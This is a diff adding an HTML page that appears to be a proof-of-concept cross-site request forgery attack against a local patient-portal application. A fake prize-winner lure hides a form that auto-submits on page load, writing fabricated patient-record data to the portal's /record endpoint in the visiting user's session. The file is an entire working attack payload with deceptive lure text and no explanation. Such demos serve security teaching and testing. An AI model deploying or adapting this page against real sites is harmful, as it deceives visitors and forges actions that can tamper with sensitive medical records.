@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Congratulations! You've Won!</title>
+</head>
+
+<body>
+    <div class="container">
+        <h1>Congratulations!</h1>
+        <p>You've been selected as today's lucky winner!</p>
+        <p>Your prize is being processed...</p>
+        <p>Do NOT leave this page!!!</p>
+        <a href="http://localhost:5000/search">Click here to claim your prize</a>
+    </div>
+
+    <iframe name="csrf-frame" style="display:none;"></iframe>
+
+    <form id="csrf-form" method="POST" action="http://localhost:5000/record" target="csrf-frame">
+        <input type="hidden" name="full_name" value="CSRF Attack">
+        <input type="hidden" name="date_of_birth" value="1999-01-01">
+        <input type="hidden" name="diagnosis" value="Pwned by CSRF">
+        <input type="hidden" name="notes" value="There never was a prize.">
+    </form>
+
+    <script>
+        document.getElementById('csrf-form').submit();
+        console.log('Malicious form submitted to patient portal. User pwned.');
+    </script>
+</body>
+
+</html>
